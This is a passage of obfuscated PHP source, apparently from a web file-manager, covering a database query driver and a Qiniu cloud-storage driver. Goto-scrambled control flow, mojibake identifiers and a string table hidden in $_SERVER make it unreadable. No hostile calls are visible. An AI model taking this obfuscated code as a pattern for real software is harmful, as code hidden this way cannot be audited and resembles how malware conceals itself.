$this->parseTable($eÍ»¦ìƒ) . $E¿À§©Ûçï[828] . implode($E¿À§©Ûçï[47], $c¹µŸ¨°«¯) . $E¿À§©Ûçï[940]; $A‡ñŒÓ† .= $this->buildSelectSql($E„ù¾œÔ‚«); goto DÒ°˜¯øĞÕ; DÒ°˜¯øĞÕ: return $this->execute($A‡ñŒÓ†, $this->parseBind(!empty($E„ù¾œÔ‚«[$E¿À§©Ûçï[279]]) ? $E„ù¾œÔ‚«[$E¿À§©Ûçï[279]] : array())); goto C°›Íˆ‡¶Ì; FŸª´µ ‡: $E¿À§©Ûçï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->model = $E„ù¾œÔ‚«[$E¿À§©Ûçï[275]]; if (is_string($c¹µŸ¨°«¯)) { $c¹µŸ¨°«¯ = explode($E¿À§©Ûçï[47], $c¹µŸ¨°«¯); } goto a•ÛÈ¡‘˜Œ; C°›Íˆ‡¶Ì: } public function update($Cè³ğ¹Ó¨œ, $d¦®²õƒ ) { $d×­¢ÚùµÇ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->model = $d¦®²õƒ [$d×­¢ÚùµÇ[275]]; $DŸÅ‡‹á¡ = $d×­¢ÚùµÇ[963] . $this->parseTable($d¦®²õƒ [$d×­¢ÚùµÇ[273]]) . $this->parseSet($Cè³ğ¹Ó¨œ) . $this->parseWhere(!empty($d¦®²õƒ [$d×­¢ÚùµÇ[269]]) ? $d¦®²õƒ [$d×­¢ÚùµÇ[269]] : $d×­¢ÚùµÇ[33]) . $this->parseOrder(!empty($d¦®²õƒ [$d×­¢ÚùµÇ[357]]) ? $d¦®²õƒ [$d×­¢ÚùµÇ[357]] : $d×­¢ÚùµÇ[33]) . $this->parseLimit(!empty($d¦®²õƒ [$d×­¢ÚùµÇ[286]]) ? $d¦®²õƒ [$d×­¢ÚùµÇ[286]] : $d×­¢ÚùµÇ[33]) . $this->parseLock(isset($d¦®²õƒ [$d×­¢ÚùµÇ[781]]) ? $d¦®²õƒ [$d×­¢ÚùµÇ[781]] : !1) . $this->parseComment(!empty($d¦®²õƒ [$d×­¢ÚùµÇ[348]]) ? $d¦®²õƒ [$d×­¢ÚùµÇ[348]] : $d×­¢ÚùµÇ[33]); return $this->execute($DŸÅ‡‹á¡, $this->parseBind(!empty($d¦®²õƒ [$d×­¢ÚùµÇ[279]]) ? $d¦®²õƒ [$d×­¢ÚùµÇ[279]] : array())); } public function delete($dÀ¢µŞ„ = array()) { $d¥šİ…­Üˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->model = $dÀ¢µŞ„[$d¥šİ…­Üˆ[275]]; $a®Í­‡Ëù = $d¥šİ…­Üˆ[964] . $this->parseTable($dÀ¢µŞ„[$d¥šİ…­Üˆ[273]]) . $this->parseWhere(!empty($dÀ¢µŞ„[$d¥šİ…­Üˆ[269]]) ? $dÀ¢µŞ„[$d¥šİ…­Üˆ[269]] : $d¥šİ…­Üˆ[33]) . $this->parseOrder(!empty($dÀ¢µŞ„[$d¥šİ…­Üˆ[357]]) ? $dÀ¢µŞ„[$d¥šİ…­Üˆ[357]] : $d¥šİ…­Üˆ[33]) . $this->parseLimit(!empty($dÀ¢µŞ„[$d¥šİ…­Üˆ[286]]) ? $dÀ¢µŞ„[$d¥šİ…­Üˆ[286]] : $d¥šİ…­Üˆ[33]) . $this->parseLock(isset($dÀ¢µŞ„[$d¥šİ…­Üˆ[781]]) ? $dÀ¢µŞ„[$d¥šİ…­Üˆ[781]] : !1) . $this->parseComment(!empty($dÀ¢µŞ„[$d¥šİ…­Üˆ[348]]) ? $dÀ¢µŞ„[$d¥šİ…­Üˆ[348]] : $d¥šİ…­Üˆ[33]); return $this->execute($a®Í­‡Ëù, $this->parseBind(!empty($dÀ¢µŞ„[$d¥šİ…­Üˆ[279]]) ? $dÀ¢µŞ„[$d¥šİ…­Üˆ[279]] : array())); } public function select($fôÏ‡‰»Ôé = array()) { goto d¼åŠ—æ×µ; cõ¤Õ¦ğõ: $E‘¶êªä = isset($fôÏ‡‰»Ôé[$cäœå½•›Û[343]]) ? $fôÏ‡‰»Ôé[$cäœå½•›Û[343]] : !1; if ($E‘¶êªä) { $B¨ƒ†…ëß‚ = is_string($E‘¶êªä[$cäœå½•›Û[89]]) ? $E‘¶êªä[$cäœå½•›Û[89]] : $cäœå½•›Û[965] . md5($Báñåß»é); $e‹ùÑàÔ = think_cache($B¨ƒ†…ëß‚, $cäœå½•›Û[33], $E‘¶êªä); if (!1 !== $e‹ùÑàÔ) { return $e‹ùÑàÔ; } } $B‘íå×¡Œ = $this->query($Báñåß»é, $this->parseBind(!empty($fôÏ‡‰»Ôé[$cäœå½•›Û[279]]) ? $fôÏ‡‰»Ôé[$cäœå½•›Û[279]] : array())); goto c•ô¾©ß˜ø; c•ô¾©ß˜ø: if ($E‘¶êªä && !1 !== $B‘íå×¡Œ) { think_cache($B¨ƒ†…ëß‚, $B‘íå×¡Œ, $E‘¶êªä); } return $B‘íå×¡Œ; goto fÖ–Š·™Àó; d¼åŠ—æ×µ: $cäœå½•›Û =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->model = $fôÏ‡‰»Ôé[$cäœå½•›Û[275]]; $Báñåß»é = $this->buildSelectSql($fôÏ‡‰»Ôé); goto cõ¤Õ¦ğõ; fÖ–Š·™Àó: } public function buildSelectSql($C®¦ç¼Šó = array()) { goto fõÕÉœÔÑƒ; fõÕÉœÔÑƒ: $CÖƒò¥õÀÚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset($C®¦ç¼Šó[$CÖƒò¥õÀÚ[347]])) { if (strpos($C®¦ç¼Šó[$CÖƒò¥õÀÚ[347]], $CÖƒò¥õÀÚ[47])) { list($f²‘¾îáêš, $aø«×¢ğ÷¦) = explode($CÖƒò¥õÀÚ[47], $C®¦ç¼Šó[$CÖƒò¥õÀÚ[347]]); } else { $f²‘¾îáêš = $C®¦ç¼Šó[$CÖƒò¥õÀÚ[347]]; } $f²‘¾îáêš = $f²‘¾îáêš ? $f²‘¾îáêš : 1; $aø«×¢ğ÷¦ = isset($aø«×¢ğ÷¦) ? $aø«×¢ğ÷¦ : (is_numeric($C®¦ç¼Šó[$CÖƒò¥õÀÚ[286]]) ? $C®¦ç¼Šó[$CÖƒò¥õÀÚ[286]] : 20); $cñ†ÁÒƒ = $aø«×¢ğ÷¦ * ((int) $f²‘¾îáêš - 1); $C®¦ç¼Šó[$CÖƒò¥õÀÚ[286]] = $cñ†ÁÒƒ . $CÖƒò¥õÀÚ[47] . $aø«×¢ğ÷¦; } if (think_config($CÖƒò¥õÀÚ[966])) { $CŒêÖ¼¸¼â = $CÖƒò¥õÀÚ[967] . md5(serialize($C®¦ç¼Šó)); $eÂå“ª¡¶È = think_cache($CŒêÖ¼¸¼â); if ($eÂå“ª¡¶È) { return $eÂå“ª¡¶È; } } goto F°ÖßÏ÷™¤; F°ÖßÏ÷™¤: $EÏÕ—çª»® = $this->parseSql($this->selectSql, $C®¦ç¼Šó); $EÏÕ—çª»® .= $this->parseLock(isset($C®¦ç¼Šó[$CÖƒò¥õÀÚ[781]]) ? $C®¦ç¼Šó[$CÖƒò¥õÀÚ[781]] : !1); if (isset($CŒêÖ¼¸¼â)) { think_cache($CŒêÖ¼¸¼â, $EÏÕ—çª»®); } goto FñÇë©ãŒ‹; FñÇë©ãŒ‹: return $EÏÕ—çª»®; goto Eš®ÂòøË¦; Eš®ÂòøË¦: } public function parseSql($eõÙ²Ë‰´ß, $d”ÁÀ ëßì = array()) { $bÚØ¼¦Ü“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eõÙ²Ë‰´ß = str_replace(array($bÚØ¼¦Ü“[968], $bÚØ¼¦Ü“[969], $bÚØ¼¦Ü“[970], $bÚØ¼¦Ü“[971], $bÚØ¼¦Ü“[972], $bÚØ¼¦Ü“[973], $bÚØ¼¦Ü“[974], $bÚØ¼¦Ü“[975], $bÚØ¼¦Ü“[976], $bÚØ¼¦Ü“[977], $bÚØ¼¦Ü“[978]), array($this->parseTable("{$d”ÁÀ ëßì[$bÚØ¼¦Ü“[273]]}"), $this->parseDistinct(isset($d”ÁÀ ëßì[$bÚØ¼¦Ü“[979]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[979]] : !1), $this->parseField(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[267]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[267]] : $bÚØ¼¦Ü“[180]), $this->parseJoin(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[276]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[276]] : $bÚØ¼¦Ü“[33]), $this->parseWhere(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[269]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[269]] : $bÚØ¼¦Ü“[33]), $this->parseGroup(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[980]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[980]] : $bÚØ¼¦Ü“[33]), $this->parseHaving(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[981]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[981]] : $bÚØ¼¦Ü“[33]), $this->parseOrder(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[357]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[357]] : $bÚØ¼¦Ü“[33]), $this->parseLimit(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[286]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[286]] : $bÚØ¼¦Ü“[33]), $this->parseUnion(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[341]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[341]] : $bÚØ¼¦Ü“[33]), $this->parseComment(!empty($d”ÁÀ ëßì[$bÚØ¼¦Ü“[348]]) ? $d”ÁÀ ëßì[$bÚØ¼¦Ü“[348]] : $bÚØ¼¦Ü“[33])), $eõÙ²Ë‰´ß); return $eõÙ²Ë‰´ß; } public function getLastSql($a„¨‘Ï¥í = '') { return $a„¨‘Ï¥í ? $this->modelSql[$a„¨‘Ï¥í] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($C¤´åâ‚Ÿ¢) { return addslashes($C¤´åâ‚Ÿ¢); } public function setModel($D”‹…Å„ä‚) { $this->model = $D”‹…Å„ä‚; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto D–‡ˆŒ°±; A‰©Øç°°ß: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($A‹«ˆ¥¬ÖÕ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÈİÅ¿ÈÈ¥×][1262]; $this->_init($A‹«ˆ¥¬ÖÕ); } public function _init($eÓ¹½æ•–„) { goto d¥ØŠŞ˜â¤; d¥ØŠŞ˜â¤: $c‰îÙÏ¥Çê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($eÓ¹½æ•–„ as $cƒ÷˜ÈŸ¦â => $a «¡¥ê) { if (isset($this->{$cƒ÷˜ÈŸ¦â})) { $this->{$cƒ÷˜ÈŸ¦â} = $a «¡¥ê; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($c‰îÙÏ¥Çê[1263] . LNG($c‰îÙÏ¥Çê[1222])); } goto F†»†ŒŠ‘; F†»†ŒŠ‘: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto aÓ³Âº­é; aÓ³Âº­é: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto fÉ¤ß²ÚÜš; fÉ¤ß²ÚÜš: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($e ‰¹ò¹íá, $DŠ‰ˆ”èš = '', $b¿Èéå“„™ = REPEAT_RENAME) { if ($this->setContent($e ‰¹ò¹íá, $DŠ‰ˆ”èš)) { return $this->getPathOuter($e ‰¹ò¹íá); } return !1; } public function mkdir($F÷‹·ñï, $E·®¨Şæµ¾ = REPEAT_SKIP) { goto dŠÚ°À×Ûì; dŠÚ°À×Ûì: $B¨Ì¶ø¯…Ğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÎÂšƒÊŒö = trim($F÷‹·ñï, $B¨Ì¶ø¯…Ğ[8]); if ($this->_isFolder($BÎÂšƒÊŒö)) { return $this->getPathOuter($BÎÂšƒÊŒö); } goto B¤ÒŠ³Õ÷; B¤ÒŠ³Õ÷: $F÷‹·ñï = $BÎÂšƒÊŒö . $B¨Ì¶ø¯…Ğ[8]; $E»‘Ò¸ˆ–¾ = get_path_this($BÎÂšƒÊŒö); $AŒ©ù×Ü = $F÷‹·ñï . $E»‘Ò¸ˆ–¾; goto e¿º¶›Èí; e¿º¶›Èí: if (!$this->mkfile($AŒ©ù×Ü)) { return !1; } if (!$this->moveFile($AŒ©ù×Ü, $F÷‹·ñï)) { $this->delFile($AŒ©ù×Ü); return !1; } return $this->getPathOuter($BÎÂšƒÊŒö); goto Cé–°ƒíñë; Cé–°ƒíñë: } public function copyFile($eäœ§¯¿‘¿, $DœÈ„°¶›) { $fØå§ôï¡¬ = $this->bucketManager->copy($this->bucket, $eäœ§¯¿‘¿, $this->bucket, $DœÈ„°¶›, !0); return $fØå§ôï¡¬ ? !1 : $this->getPathOuter($DœÈ„°¶›); } public function moveFile($aîÌÑ÷Â‘, $d³ÆÃ®Â‹) { $F·Ûƒ³°º  = $this->bucketManager->move($this->bucket, $aîÌÑ÷Â‘, $this->bucket, $d³ÆÃ®Â‹, !0); return $F·Ûƒ³°º  ? !1 : $this->getPathOuter($d³ÆÃ®Â‹); } public function delFile($Cè»¾¨ğÕ‚) { if (!$this->exist($Cè»¾¨ğÕ‚)) { return !0; } $B””Éò¼Òñ = $this->bucketManager->delete($this->bucket, $Cè»¾¨ğÕ‚); return $B””Éò¼Òñ ? !1 : !0; } public function delFolder($A‚¼»Ï½èÖ) { goto e‡¢¢‰è¡Ñ; F”Ëµ©¯º½: return $this->delByBatch($e££ÅËåæğ[$eŒ½æÏ–ƒÅ[74]]); goto A…ÛŒŸèÉµ; e‡¢¢‰è¡Ñ: $eŒ½æÏ–ƒÅ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->exist($A‚¼»Ï½èÖ)) { return !0; } $this->listItemCache = !1; goto c²ÂÊö»ãõ; c²ÂÊö»ãõ: $e££ÅËåæğ = $this->fileList($A‚¼»Ï½èÖ); $this->listItemCache = !0; $dÉ½ë“»¹ = trim($A‚¼»Ï½èÖ, $eŒ½æÏ–ƒÅ[8]) . $eŒ½æÏ–ƒÅ[8]; goto f˜–ö—ğ; f˜–ö—ğ: if (!empty($A‚¼»Ï½èÖ) && !in_array($dÉ½ë“»¹, $e££ÅËåæğ[$eŒ½æÏ–ƒÅ[74]])) { $e££ÅËåæğ[$eŒ½æÏ–ƒÅ[74]][] = $dÉ½ë“»¹; } $dÜé¼¬õÈ„ = $this->delByBatch($e££ÅËåæğ[$eŒ½æÏ–ƒÅ[73]]); if (!$dÜé¼¬õÈ„) { return !1; } goto F”Ëµ©¯º½; A…ÛŒŸèÉµ: } private function delByBatch($aƒ½é†·‰) { foreach (array_chunk($aƒ½é†·‰, 1000) as $d×Êï‚¹àƒ) { $Eèããê›õò = $this->bucketManager->buildBatchDelete($this->bucket, $d×Êï‚¹àƒ); list($AÎ˜Šî¸¼, $AÙËô¤ô„ù) = $this->bucketManager->batch($Eèããê›õò); if ($AÙËô¤ô„ù) { return !1; } } return !0; } public function rename($bÂÇ·Ç»ñÛ, $B„ì¸ğ·¡ñ) { return $this->renameObject($bÂÇ·Ç»ñÛ, $B„ì¸ğ·¡ñ); } public function fileInfo($bÙ‰îó†İ¦, $B‰êÜé£ï‰ = false, $DĞêêØ¾Û§ = array()) { goto D›ÇÁ·½; E¦—”ì—°®: $F°À‹èÉ±²[$fÖ¼’ğéİ¯[190]] = $F°À‹èÉ±²[$fÖ¼’ğéİ¯[107]] = 0; $F°À‹èÉ±²[$fÖ¼’ğéİ¯[191]] = $F°À‹èÉ±²[$fÖ¼’ğéİ¯[192]] = !0; if (empty($DĞêêØ¾Û§)) { $DĞêêØ¾Û§ = $this->objectMeta($bÙ‰îó†İ¦); if (!$DĞêêØ¾Û§) { return $F°À‹èÉ±²; } } goto a„ÜõŠ™å; D›ÇÁ·½: $fÖ¼’ğéİ¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F°À‹èÉ±² = array($fÖ¼’ğéİ¯[28] => $this->pathThis($bÙ‰îó†İ¦), $fÖ¼’ğéİ¯[75] => $this->getPathOuter($fÖ¼’ğéİ¯[8] . $bÙ‰îó†İ¦), $fÖ¼’ğéİ¯[29] => $fÖ¼’ğéİ¯[171], $fÖ¼’ğéİ¯[77] => isset($DĞêêØ¾Û§[$fÖ¼’ğéİ¯[1264]]) ? $DĞêêØ¾Û§[$fÖ¼’ğéİ¯[1264]] : 0, $fÖ¼’ğéİ¯[165] => $this->ext($bÙ‰îó†İ¦)); if ($B‰êÜé£ï‰) { return $F°À‹èÉ±²; } goto E¦—”ì—°®; a„ÜõŠ™å: if (isset($DĞêêØ¾Û§[$fÖ¼’ğéİ¯[1265]])) { $F°À‹èÉ±²[$fÖ¼’ğéİ¯[107]] = substr($DĞêêØ¾Û§[$fÖ¼’ğéİ¯[1265]] . $fÖ¼’ğéİ¯[33], 0, 10); } if (isset($DĞêêØ¾Û§[$fÖ¼’ğéİ¯[1264]])) { $F°À‹èÉ±²[$fÖ¼’ğéİ¯[77]] = $DĞêêØ¾Û§[$fÖ¼’ğéİ¯[1264]]; } return $F°À‹èÉ±²; goto E‚ë­˜ÕŞ; E‚ë­˜ÕŞ: } public function folderInfo($CõÓ¶ƒí¼, $bìº±ÕÁ‚ = false) { goto aîŸœ»; Aæ·é¬Ã³¹: $A±‰ÄºÌ„ì[$EÔŠ§ŞĞ‡é[190]] = $A±‰ÄºÌ„ì[$EÔŠ§ŞĞ‡é[107]] = 0; $A±‰ÄºÌ„ì[$EÔŠ§ŞĞ‡é[191]] = $A±‰ÄºÌ„ì[$EÔŠ§ŞĞ‡é[192]] = !0; $CõÓ¶ƒí¼ = rtrim($CõÓ¶ƒí¼, $EÔŠ§ŞĞ‡é[8]) . $EÔŠ§ŞĞ‡é[8]; goto DµÒ•ñä“•; aîŸœ»: $EÔŠ§ŞĞ‡é =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A±‰ÄºÌ„ì = array($EÔŠ§ŞĞ‡é[28] => $this->pathThis($CõÓ¶ƒí¼), $EÔŠ§ŞĞ‡é[75] => $this->getPathOuter($EÔŠ§ŞĞ‡é[8] . $CõÓ¶ƒí¼), $EÔŠ§ŞĞ‡é[29] => $EÔŠ§ŞĞ‡é[76]); if ($bìº±ÕÁ‚) { return $A±‰ÄºÌ„ì; } goto Aæ·é¬Ã³¹; DµÒ•ñä“•: $D¿Öêã‰æ¼ = $this->objectMeta($CõÓ¶ƒí¼); if (isset($D¿Öêã‰æ¼[$EÔŠ§ŞĞ‡é[1265]])) { $A±‰ÄºÌ„ì[$EÔŠ§ŞĞ‡é[107]] = substr($D¿Öêã‰æ¼[$EÔŠ§ŞĞ‡é[1265]] . $EÔŠ§ŞĞ‡é[33], 0, 10); } return $A±‰ÄºÌ„ì; goto eÅå°øàªõ; eÅå°øàªõ: } public function listPath($B‡†ê±è‰, $C»…©¼ä› = false) { $AÆ†á¿âÄ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AéÑÖ˜Ù‡å = $this->fileList($B‡†ê±è‰, $AÆ†á¿âÄ[8], !0); foreach ($AéÑÖ˜Ù‡å[$AÆ†á¿âÄ[74]] as $AˆõÂŠÉƒ => $DÎ²ŞªŞÉï) { $AéÑÖ˜Ù‡å[$AÆ†á¿âÄ[74]][$AˆõÂŠÉƒ] = $this->folderInfo($DÎ²ŞªŞÉï, $C»…©¼ä›); } foreach ($AéÑÖ˜Ù‡å[$AÆ†á¿âÄ[73]] as $AˆõÂŠÉƒ => $DÎ²ŞªŞÉï) { $AéÑÖ˜Ù‡å[$AÆ†á¿âÄ[73]][$AˆõÂŠÉƒ] = $this->fileInfo($DÎ²ŞªŞÉï[$AÆ†á¿âÄ[89]], $C»…©¼ä›, $DÎ²ŞªŞÉï); } return $AéÑÖ˜Ù‡å; } public function has($Eª–Îà©ˆ, $F—£»™§Ş = false, $CáÎèĞ”Æ = true) { goto fÖïæŒóË; CÇÁèÒ¾Ø: $A˜åšÈ‰‹ = $eíŸù­‚Š = 0; while (!0) { check_abort(); list($cÃĞÂ‹·¨÷, $CÓá™»¯­º) = $this->bucketManager->listFiles($this->bucket, $bÇÃ›ìÚä, $AŒ³ÅÀ«Ì, $c¶Š¦£¨³, $c»¨Ã‰“İİ); if ($CÓá™»¯­º) { break; } $AŒ³ÅÀ«Ì = array_key_exists($Dë£áÇß…Ï[1234], $cÃĞÂ‹·¨÷) ? $AŒ³ÅÀ«Ì = $cÃĞÂ‹·¨÷[$Dë£áÇß…Ï[1266]] : $Dë£áÇß…Ï[33]; if ($F—£»™§Ş) { if (!empty($cÃĞÂ‹·¨÷[$Dë£áÇß…Ï[1267]])) { $A˜åšÈ‰‹ += count($cÃĞÂ‹·¨÷[$Dë£áÇß…Ï[1267]]); } if (!empty($cÃĞÂ‹·¨÷[$Dë£áÇß…Ï[1268]])) { $eíŸù­‚Š += count($cÃĞÂ‹·¨÷[$Dë£áÇß…Ï[1268]]); } if ($AŒ³ÅÀ«Ì === $Dë£áÇß…Ï[33]) { break; } continue; } if ($CáÎèĞ”Æ) { if (!empty($cÃĞÂ‹·¨÷[$Dë£áÇß…Ï[1267]])) { return !0; } } else { if (!empty($cÃĞÂ‹·¨÷[$Dë£áÇß…Ï[1268]])) { return !0; } } if ($AŒ³ÅÀ«Ì === $Dë£áÇß…Ï[33]) { break; } } if ($F—£»™§Ş) { return array($Dë£áÇß…Ï[199] => $A˜åšÈ‰‹, $Dë£áÇß…Ï[200] => $eíŸù­‚Š); } goto c‚¢­Ü¸Œ; D’Á—Øè‰‹: $AŒ³ÅÀ«Ì = $Dë£áÇß…Ï[33]; $c¶Š¦£¨³ = 500; $c»¨Ã‰“İİ = $Dë£áÇß…Ï[8]; goto CÇÁèÒ¾Ø; fÖïæŒóË: $Dë£áÇß…Ï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eª–Îà©ˆ = trim($Eª–Îà©ˆ, $Dë£áÇß…Ï[8]); $bÇÃ›ìÚä = empty($Eª–Îà©ˆ) ? $Dë£áÇß…Ï[33] : $Eª–Îà©ˆ . $Dë£áÇß…Ï[8]; goto D’Á—Øè‰‹; c‚¢­Ü¸Œ: return !1; goto bÕæ¦Ï»‰¥; bÕæ¦Ï»‰¥: } public function listAll($cƒ‚ –¡½ß) { $dÜÈÀç‘“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cª½Œš‚Ô– = $this->fileList($cƒ‚ –¡½ß, $dÜÈÀç‘“[33], !0); $b Ö¹èç¬ì = array(); foreach ($Cª½Œš‚Ô–[$dÜÈÀç‘“[73]] as $A¼åòÉÛë) { $b Ö¹èç¬ì[$A¼åòÉÛë[$dÜÈÀç‘“[89]]] = $A¼åòÉÛë[$dÜÈÀç‘“[77]]; } foreach ($Cª½Œš‚Ô–[$dÜÈÀç‘“[74]] as $A¼åòÉÛë) { if (is_string($A¼åòÉÛë)) { $b Ö¹èç¬ì[$A¼åòÉÛë] = 0; } } return $this->listAllFiles($cƒ‚ –¡½ß, array_keys($b Ö¹èç¬ì), $b Ö¹èç¬ì); } private function fileList($bøÂùÀ–¤­, $D¡Ÿë°× = '', $fù ÎÊ¬Âµ = 0) { goto a‰‚Ä‘©¡À; aò­ŠÃĞ: $EÄÛ÷Ò§İ¸ = $eãµ‰³Ñ©º = array(); while (!0) { check_abort(); list($D—É½›Çò†, $BÊÀ†˜ùìœ) = $this->bucketManager->listFiles($this->bucket, $c«íŸòÃ¡, $Aê¿âœø‹, $d—ÕºœĞƒ®, $D¡Ÿë°×); if ($BÊÀ†˜ùìœ) { break; } $Aê¿âœø‹ = array_key_exists($BâŞ–ÕŠ„[1234], $D—É½›Çò†) ? $Aê¿âœø‹ = $D—É½›Çò†[$BâŞ–ÕŠ„[1266]] : $BâŞ–ÕŠ„[33]; $B§Ü„¡œ°’ = isset($D—É½›Çò†[$BâŞ–ÕŠ„[1267]]) ? $D—É½›Çò†[$BâŞ–ÕŠ„[1267]] : array(); $eåƒêŠéáğ = isset($D—É½›Çò†[$BâŞ–ÕŠ„[1268]]) ? $D—É½›Çò†[$BâŞ–ÕŠ„[1268]] : array(); foreach ($B§Ü„¡œ°’ as $e®‡íÛƒİ) { goto c‘ïšİ½ÅÑ; DßÜÑã¨‹Ğ: if ($f¤æê’‘×‡) { $EÄÛ÷Ò§İ¸[] = $AŠŞÀëš¨ø; continue; } $eãµ‰³Ñ©º[] = $fù ÎÊ¬Âµ ? $e®‡íÛƒİ : $AŠŞÀëš¨ø; goto C‘•åîñêê; A¹˜îÈô­: $e®‡íÛƒİ[$BâŞ–ÕŠ„[77]] = $F¬Ïãå“œ£; $f¤æê’‘×‡ = $F¬Ïãå“œ£ == 0 && substr($AŠŞÀëš¨ø, strlen($AŠŞÀëš¨ø) - 1, 1) == $BâŞ–ÕŠ„[8] ? !0 : !1; if ($aÅ‚äçÏ½À) { $this->cacheMethod($BâŞ–ÕŠ„[195], $AŠŞÀëš¨ø, $f¤æê’‘×‡); $this->cacheMethod($BâŞ–ÕŠ„[196], $AŠŞÀëš¨ø, $e®‡íÛƒİ); } goto DßÜÑã¨‹Ğ; c‘ïšİ½ÅÑ: if ($e®‡íÛƒİ[$BâŞ–ÕŠ„[89]] == $c«íŸòÃ¡) { continue; } $AŠŞÀëš¨ø = $e®‡íÛƒİ[$BâŞ–ÕŠ„[89]]; $F¬Ïãå“œ£ = $e®‡íÛƒİ[$BâŞ–ÕŠ„[1264]]; goto A¹˜îÈô­; C‘•åîñêê: } foreach ($eåƒêŠéáğ as $AŠŞÀëš¨ø) { if ($AŠŞÀëš¨ø == $c«íŸòÃ¡) { continue; } $EÄÛ÷Ò§İ¸[] = $AŠŞÀëš¨ø; if ($aÅ‚äçÏ½À) { $this->cacheMethod($BâŞ–ÕŠ„[195], $AŠŞÀëš¨ø, !0); } } if ($Aê¿âœø‹ === $BâŞ–ÕŠ„[33]) { break; } } if ($aÅ‚äçÏ½À) { $this->cacheMethod($BâŞ–ÕŠ„[195], $bøÂùÀ–¤­, !0); } goto dÖ†©ï‡­ƒ; dÖ†©ï‡­ƒ: return array($BâŞ–ÕŠ„[74] => $EÄÛ÷Ò§İ¸, $BâŞ–ÕŠ„[73] => $eãµ‰³Ñ©º); goto D…½¡‰Ì Ò; FšæÔ¤Ú‹ù: $Aê¿âœø‹ = $BâŞ–ÕŠ„[33]; $d—ÕºœĞƒ® = 1000; $aÅ‚äçÏ½À = $this->listItemCache === !1 ? !1 : !0; goto aò­ŠÃĞ; a‰‚Ä‘©¡À: $BâŞ–ÕŠ„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bøÂùÀ–¤­ = trim($bøÂùÀ–¤­, $BâŞ–ÕŠ„[8]); $c«íŸòÃ¡ = empty($bøÂùÀ–¤­) ? $BâŞ–ÕŠ„[33] : $bøÂùÀ–¤­ . $BâŞ–ÕŠ„[8]; goto FšæÔ¤Ú‹ù; D…½¡‰Ì Ò: } public function canRead($AŠ¢¤Œïó) { return $this->exist($AŠ¢¤Œïó) ? !0 : !1; } public function canWrite($a‰¼æÑ¶“) { return $this->exist($a‰¼æÑ¶“) ? !0 : !1; } public function getContent($f¼Ø¶ò«®) { return $this->fileSubstr($f¼Ø¶ò«®, 0, -1); } public function setContent($d£òôååÌœ, $C†„ª—Åç = '') { $dšÂøÆôù¿ = $this->tempFile($this->pathThis($d£òôååÌœ)); file_put_contents($dšÂøÆôù¿, $C†„ª—Åç); if ($this->upload($d£òôååÌœ, $dšÂøÆôù¿)) { $this->tempFileRemve($dšÂøÆôù¿); return !0; } return !1; } public function refreshUrls($FñÖª­íÒî) { goto cÆÑ‘—æ¦; BÊŸ®ä‚: return $dî¿ÁÚ¿”ù[$AÓ‚¢âÕÅ[1042]] == $AÓ‚¢âÕÅ[704] ? !0 : !1; goto f¥ë¸‰“Ë; cÆÑ‘—æ¦: $AÓ‚¢âÕÅ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a¬µ‡çô = array(); if (is_array($FñÖª­íÒî)) { foreach ($FñÖª­íÒî as $a÷ùÖ´¥Î) { $a¬µ‡çô[] = $this->link($a÷ùÖ´¥Î); } } else { $a¬µ‡çô[] = $this->link($FñÖª­íÒî); } goto aÖ¡ô˜¦£¡; aÖ¡ô˜¦£¡: $DîŞçÍŠÕí = new Qiniu\Cdn\CdnManager($this->auth); list($dî¿ÁÚ¿”ù, $FÌ‘šœ®é†) = $DîŞçÍŠÕí->refreshUrls($a¬µ‡çô); if ($FÌ‘šœ®é†) { return !1; } goto BÊŸ®ä‚; f¥ë¸‰“Ë: } public function fileSubstr($F£«ùèÄ©é, $aİ‘ëÓ¬ØÏ, $d™ñÑ‘îïÖ) { $aãÊ‹İÙ±¢ =& 